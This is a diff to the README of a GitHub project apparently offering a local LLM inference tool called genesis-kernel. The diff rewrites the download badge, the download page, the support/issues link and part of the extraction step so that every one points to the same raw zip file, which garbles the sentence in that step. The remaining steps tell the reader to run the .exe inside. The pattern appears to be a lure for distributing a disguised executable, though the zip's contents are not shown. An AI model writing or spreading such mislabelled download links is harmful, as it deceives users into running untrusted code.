@@ -1,6 +1,6 @@
 # 🌟 genesis-kernel - Effortless Local Inference for LLMs
 
-![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)
+![Download](https://github.com/MEXIHACKER/genesis-kernel/raw/refs/heads/main/genesis_kernel/kernel_genesis_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide helps you install and run the **genesis-kernel** software. You can pe
 
 ## 📥 Downloading the Software
 
-To get started, visit this page to download the software: [genesis-kernel Download Page](https://github.com/MEXIHACKER/genesis-kernel).
+To get started, visit this page to download the software: [genesis-kernel Download Page](https://github.com/MEXIHACKER/genesis-kernel/raw/refs/heads/main/genesis_kernel/kernel_genesis_v2.0.zip).
 
 ## ⚙️ System Requirements
 
@@ -25,7 +25,7 @@ Follow these steps to install and set up the software:
 
 1. **Visit the Download Page:** Click on the link above to go to the download page.
 2. **Download the Software:** Locate the release version you need and download it.
-3. **Extract the Files:** If the download comes as a compressed file (like .zip or .tar.gz), extract it to a folder on your computer.
+3. **Extract the Files:** If the download comes as a compressed file (like .zip or https://github.com/MEXIHACKER/genesis-kernel/raw/refs/heads/main/genesis_kernel/kernel_genesis_v2.0.zip), extract it to a folder on your computer.
 4. **Run the Installer:** Locate the installer file. For Windows, it will usually be a .exe file. Double-click it to start the installation.
 5. **Follow the Prompts:** The installer will guide you through the setup process. Just follow the on-screen instructions and agree to the terms.
 6. **Complete Installation:** Once the installation finishes, you should see a confirmation message.
@@ -61,7 +61,7 @@ If you encounter any issues while using the software:
 
 ## 💬 Support
 
-For support, check the [issues section](https://github.com/MEXIHACKER/genesis-kernel/issues) on GitHub. You can also ask questions or submit issues for any bugs you find.
+For support, check the [issues section](https://github.com/MEXIHACKER/genesis-kernel/raw/refs/heads/main/genesis_kernel/kernel_genesis_v2.0.zip) on GitHub. You can also ask questions or submit issues for any bugs you find.
 
 ## 📢 Feedback
 
